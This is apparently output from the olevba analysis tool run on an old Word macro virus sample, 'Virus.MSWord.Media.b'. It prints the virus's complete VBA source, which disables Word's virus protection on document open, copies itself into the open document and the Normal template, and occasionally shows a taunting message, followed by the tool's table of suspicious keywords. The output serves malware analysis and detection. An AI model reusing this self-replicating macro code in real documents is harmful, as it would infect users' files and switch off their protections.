olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Media.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Media.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open()
Options.VirusProtection = False
Options.SaveNormalPrompt = False

Set Target = ActiveDocument.VBProject.VBComponents(1).CodeModule
If Target.countoflines = 0 Then Target.addfromstring ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents(1).CodeModule.countoflines): ActiveDocument.Save

Set Target = NormalTemplate.VBProject.VBComponents(1).CodeModule
If Target.countoflines = 0 Then Target.addfromstring ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents(1).CodeModule.countoflines)

If Int(Rnd * 25) = 6 Then MsgBox "Dat mediatheekmens SUCKS!!!"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

